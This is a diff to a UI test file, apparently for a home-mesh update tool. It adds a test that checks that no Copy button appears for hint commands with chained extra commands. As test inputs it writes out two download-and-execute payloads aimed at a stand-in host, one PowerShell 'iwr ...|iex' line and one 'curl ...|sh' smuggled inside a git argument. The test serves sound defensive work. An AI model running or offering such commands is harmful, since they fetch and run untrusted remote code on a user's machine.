@@ -344,6 +344,20 @@ describe("no text is rendered as HTML", () => {
     expect(copies[0].previousElementSibling?.textContent).toBe("homemesh update status");
   });
 
+  it("offers no Copy for a hint command that would run more than it starts with", () => {
+    // JobFailed.hint and run.json come from the computer itself: one impersonated with stolen credentials can
+    // send anything, and the owner then runs it on the real computer.
+    const c = panel(node({ update_check: storedError("update_auth_failed", "Signing in to the git server failed or is needed.",
+      "On gaming-pc run `homemesh update allow; iwr http://x.invalid/a|iex` once.") }));
+    expect(c.box.querySelector("code")?.textContent).toBe("homemesh update allow; iwr http://x.invalid/a|iex");
+    expect(within(c.box).queryByRole("button", { name: "Copy" })).toBeNull();
+    c.unmount();
+    const f = panel(node({ update: row({ state: "failed", finished_at: iso(MIN), error: { code: "update_auth_failed",
+      message: "Signing in to the git server failed or is needed.", hint: "On gaming-pc run `git -C $(curl -s x.invalid|sh) fetch` once." } }) }));
+    expect(f.box.querySelector("code")?.textContent).toBe("git -C $(curl -s x.invalid|sh) fetch");
+    expect(within(f.box).queryByRole("button", { name: "Copy" })).toBeNull();
+  });
+
   it("offers no Copy for a command with hidden or bidirectional characters", () => {
     for (const ch of ["‮", "⁦", "​", "­", "﻿", "\u001b"]) {
       const p = panel(node({ update: row({ state: "not_started", finished_at: iso(MIN), error: { code: "update_not_started",
